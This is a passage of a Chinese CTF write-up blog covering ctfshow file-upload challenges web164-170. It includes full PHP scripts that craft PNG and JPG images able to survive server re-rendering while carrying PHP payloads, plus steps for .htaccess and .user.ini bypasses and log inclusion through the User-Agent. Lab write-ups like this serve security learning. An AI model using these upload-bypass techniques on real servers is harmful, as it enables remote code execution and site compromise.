+<p><img src="https://img-blog.csdnimg.cn/20210207154429285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web164-二次渲染"><a href="#web164-二次渲染" class="headerlink" title="web164(二次渲染)"></a>web164(二次渲染)</h2><ul>
+<li>知识点： <a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">二次渲染</a></li>
+</ul>
+<p>后端进行二次渲染 ,利用 imagecreatefrompng().<br>png和jpg要利用脚本生成图片马,gif文件只需要将图片下载回来对照,shell写入未改动的区域</p>
+<p>png：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = 0; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += 3) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+1];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+2];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / 3), 0, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210207154715910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210207154757101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web165-二次渲染"><a href="#web165-二次渲染" class="headerlink" title="web165(二次渲染)"></a>web165(二次渲染)</h2><ul>
+<li>二次渲染<br>jpg:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, <span class="built_in">which</span> will keep unchanged after transformations caused by PHP <span class="built_in">functions</span> imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In <span class="keyword">case</span> of successful injection you will get a specially crafted image, <span class="built_in">which</span> should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs <span class="string">&quot;Something&#x27;s wrong&quot;</span>.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!isset(<span class="variable">$argv</span>[1])) &#123;</span><br><span class="line">        die(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = 0; <span class="variable">$pad</span> &lt; 1024; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = new DataInputStream(<span class="variable">$argv</span>[1]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[1]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = 0;</span><br><span class="line">        <span class="variable">$correctImage</span> = TRUE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - 2;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === 0xDA) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                    substr(<span class="variable">$outStream</span>, 0, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[1], <span class="variable">$outStreamTmp</span>, TRUE);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== 0) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                <span class="built_in">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - 2;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> =</span><br><span class="line">                        substr(<span class="variable">$outStream</span>, 0, <span class="variable">$startPos</span>) .</span><br><span class="line">                        <span class="variable">$miniPayload</span> .</span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            0,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; elseif(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[1], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    die(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[1]);</span><br><span class="line">    die(<span class="string">&#x27;Something\&#x27;</span>s wrong<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span></span><br><span class="line"><span class="string">        global $correctImage;</span></span><br><span class="line"><span class="string">        file_put_contents($filename, $data);</span></span><br><span class="line"><span class="string">        $correctImage = TRUE;</span></span><br><span class="line"><span class="string">        imagecreatefromjpeg($filename);</span></span><br><span class="line"><span class="string">        if($unlink)</span></span><br><span class="line"><span class="string">            unlink($filename);</span></span><br><span class="line"><span class="string">        return $correctImage;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span></span><br><span class="line"><span class="string">        global $extraBytes, $correctImage;</span></span><br><span class="line"><span class="string">        $correctImage = FALSE;</span></span><br><span class="line"><span class="string">        if(preg_match(&#x27;</span>/(\d+) extraneous bytes before marker/<span class="string">&#x27;, $errstr, $m)) &#123;</span></span><br><span class="line"><span class="string">            if(isset($m[1])) &#123;</span></span><br><span class="line"><span class="string">                $extraBytes = (int)$m[1];</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    class DataInputStream &#123;</span></span><br><span class="line"><span class="string">        private $binData;</span></span><br><span class="line"><span class="string">        private $order;</span></span><br><span class="line"><span class="string">        private $size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public function __construct($filename, $order = false, $fromString = false) &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;binData = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">            $this-&gt;order = $order;</span></span><br><span class="line"><span class="string">            if(!$fromString) &#123;</span></span><br><span class="line"><span class="string">                if(!file_exists($filename) || !is_file($filename))</span></span><br><span class="line"><span class="string">                    die(&#x27;</span>File not exists [<span class="string">&#x27;.$filename.&#x27;</span>]<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">                $this-&gt;binData = file_get_contents($filename);</span></span><br><span class="line"><span class="string">            &#125; else &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;binData = $filename;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $this-&gt;size = strlen($this-&gt;binData);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public function seek() &#123;</span></span><br><span class="line"><span class="string">            return ($this-&gt;size - strlen($this-&gt;binData));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public function skip($skip) &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public function readByte() &#123;</span></span><br><span class="line"><span class="string">            if($this-&gt;eof()) &#123;</span></span><br><span class="line"><span class="string">                die(&#x27;</span>End Of File<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $byte = substr($this-&gt;binData, 0, 1);</span></span><br><span class="line"><span class="string">            $this-&gt;binData = substr($this-&gt;binData, 1);</span></span><br><span class="line"><span class="string">            return ord($byte);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public function readShort() &#123;</span></span><br><span class="line"><span class="string">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span></span><br><span class="line"><span class="string">                die(&#x27;</span>End Of File<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $short = substr($this-&gt;binData, 0, 2);</span></span><br><span class="line"><span class="string">            $this-&gt;binData = substr($this-&gt;binData, 2);</span></span><br><span class="line"><span class="string">            if($this-&gt;order) &#123;</span></span><br><span class="line"><span class="string">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span></span><br><span class="line"><span class="string">            &#125; else &#123;</span></span><br><span class="line"><span class="string">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return $short;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public function eof() &#123;</span></span><br><span class="line"><span class="string">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="web166-前端限制"><a href="#web166-前端限制" class="headerlink" title="web166(前端限制)"></a>web166(前端限制)</h2><ul>
+<li>知识点：zip在bp时需要修改格式</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210207155332356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传.zip文件</p>
+<blockquote>
+<p>注意修改Content-Type为application/x-zip-compressed</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207155402568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210207155418493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web167-htaccess配置文件"><a href="#web167-htaccess配置文件" class="headerlink" title="web167 (.htaccess配置文件)"></a>web167 (.htaccess配置文件)</h2><ul>
+<li>知识点：.htaccess</li>
+</ul>
+<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207155842122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>将.png后缀的文件解析 成php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207160100574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传.png 文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207160156995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>访问/upload/1.png即可</p>
+<hr>
+<h2 id="web168-过滤"><a href="#web168-过滤" class="headerlink" title="web168(过滤)"></a>web168(过滤)</h2><p>可以上传php文件，但是过滤了关键字eval system</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207160411769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>访问一下<br><img src="https://img-blog.csdnimg.cn/2021020716050553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web169-日志包含"><a href="#web169-日志包含" class="headerlink" title="web169(日志包含)"></a>web169(日志包含)</h2><p>前端限制格式，后端又限制很多<br>所以我们直接配置文件绕过<br>上传ini  日志包含<br><img src="https://img-blog.csdnimg.cn/20210207160545769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传所需的php文件 修改UA，蚁剑连接</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207160602178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web170-日志包含"><a href="#web170-日志包含" class="headerlink" title="web170(日志包含)"></a>web170(日志包含)</h2><p><img src="https://img-blog.csdnimg.cn/20210207160627232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传2.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207160717602.png#pic_center"><br>蚁剑</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/29/ctfshow%20web%E5%85%A5%E9%97%A8(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)/" rel="prev" title="ctfshow web入门(文件包含)">
+      <i class="fa fa-chevron-left"></i> ctfshow web入门(文件包含)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/08/hgame2021-week1%20wp/" rel="next" title="hgame2021 -week 1">
+      hgame2021 -week 1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web151-%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">web151 (前端限制)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web152-%E5%90%8E%E7%AB%AF%E9%99%90%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">web152(后端限制)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web153-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">web153(.user.ini配置文件绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web154-%E9%99%90%E5%88%B6%E5%AD%97%E7%AC%A6"><span class="nav-number">4.</span> <span class="nav-text">web154(限制字符)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web155-%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">web155(短标签绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web156-%E8%BF%87%E6%BB%A4"><span class="nav-number">6.</span> <span class="nav-text">web156(过滤)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web157-159-%E8%BF%87%E6%BB%A4"><span class="nav-number">7.</span> <span class="nav-text">web157-159(过滤)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web160-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">8.</span> <span class="nav-text">web160(日志包含)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web161-%E6%A3%80%E6%9F%A5%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="nav-number">9.</span> <span class="nav-text">web161(检查十六进制文件头)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web162-163-%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6"><span class="nav-number">10.</span> <span class="nav-text">web162-163(包含session文件)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web164-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">11.</span> <span class="nav-text">web164(二次渲染)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web165-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">12.</span> <span class="nav-text">web165(二次渲染)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web166-%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="nav-number">13.</span> <span class="nav-text">web166(前端限制)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web167-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">14.</span> <span class="nav-text">web167 (.htaccess配置文件)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web168-%E8%BF%87%E6%BB%A4"><span class="nav-number">15.</span> <span class="nav-text">web168(过滤)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web169-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">16.</span> <span class="nav-text">web169(日志包含)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 